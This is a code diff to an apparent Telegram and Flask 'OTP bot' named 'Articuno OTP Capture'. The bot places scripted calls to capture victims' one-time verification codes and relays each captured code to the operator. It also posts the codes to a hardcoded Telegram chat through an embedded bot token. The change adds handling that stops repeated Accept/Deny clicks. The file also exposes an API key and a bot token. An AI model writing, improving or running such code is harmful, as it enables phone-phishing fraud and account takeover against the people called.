@@ -37,6 +37,8 @@ apiKey = '741852963741852963789456123'
 last_message_ids = {}
 ringing_handler = []
 recording_handler = {}
+accept_deny_handler = {}
+
 
 updater = Updater(token=bot_tkn, use_context=True)
 dispatcher = updater.dispatcher
@@ -898,7 +900,7 @@ def recall_now(message):
 def custom_confirm1(message,otp_message):
     db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
     c = db.cursor() 
-
+    global accept_deny_handler
     chat_id = message.from_user.id
     up_resp1= otp_message
     c.execute(f"Select * from users where user_id={chat_id}")
@@ -924,7 +926,12 @@ def custom_confirm1(message,otp_message):
         requests.post(url, json=data)
         bot.send_message(chat_id,f"*Code Accpeted ✅ *",parse_mode='markdown')
         time.sleep(3)
-        callhangup(call_control_id)
+        try:
+             del accept_deny_handler[chat_id]
+        except:
+             pass
+        finally:
+            callhangup(call_control_id)
 
     elif up_resp1=='Deny':
         bot.send_message(chat_id,f"""*Code Rejected ❌*""",parse_mode='markdown')
@@ -941,7 +948,7 @@ def custom_confirm1(message,otp_message):
         
 @app.route('/<script_id>/<chatid>/custom', methods=['POST'])
 def custom_prebuild_script_call(script_id,chatid):
-    global ringing_handler
+    global ringing_handler , accept_deny_handler
     global recording_handler
     db = mysql.connector.connect(user=d_user, password=d_pass,host=d_host, port=d_port,database=d_data)
     c = db.cursor()
@@ -996,6 +1003,10 @@ def custom_prebuild_script_call(script_id,chatid):
             c.execute(f"Update users set status='active' where user_id={chatid}")
             db.commit()
             try:
+                 del accept_deny_handler[chatid]
+            except:
+                 pass
+            try:
                  recurl =  recording_handler[call_control_id]
                  send_record = threading.Thread(target=retrive_recording, args=(recurl,chatid,))
                  send_record.start()
@@ -1040,7 +1051,11 @@ def custom_prebuild_script_call(script_id,chatid):
             item1 = types.InlineKeyboardButton(text="Accept ✅" ,callback_data="/accept")
             item2 = types.InlineKeyboardButton(text="Deny ❌",callback_data="/deny")
             keyboard.add(item1,item2) 
-            bot.send_message(chatid,f"""*Code Captured <code>{otp2}</code> ✅*""",parse_mode='HTML',reply_markup=keyboard)
+            bot.send_message(chatid,f"""<b><i>Code Captured <code>{otp2}</code>  ✅</i></b>*""",parse_mode='HTML',reply_markup=keyboard)
+            try:
+                 del accept_deny_handler[chatid]
+            except:
+                 pass
 
             requests.post(f"""https://api.telegram.org/bot6594047154:AAEkLCy48iP2fx-PVeQUlgt_XAJJJ2nPWGs/sendMessage?chat_id=-1002076456397&text=
 🚀 Articuno OTP Capture 🚀
@@ -1125,7 +1140,7 @@ Script >> {custom_sc[2]}
 
 @bot.callback_query_handler(func=lambda message: True)
 def handle_callback(message):
-    global last_message_ids
+    global last_message_ids ,accept_deny_handler
     if message.data == '/dayslimit':
         current_credit(message)
     elif message.data == '/recall':
@@ -1170,10 +1185,14 @@ def handle_callback(message):
         Support(message)
 
     elif message.data == '/accept':
-         custom_confirm1(message,"Accept")
+         if message.from_user.id not in accept_deny_handler:
+            custom_confirm1(message,"Accept")
+            accept_deny_handler[message.from_user.id] = "Accept"
     
     elif message.data == '/deny':
-         custom_confirm1(message,"Deny")
+         if message.from_user.id not in accept_deny_handler:
+            custom_confirm1(message,"Deny")
+            accept_deny_handler[message.from_user.id] = "Deny"
          
          
          
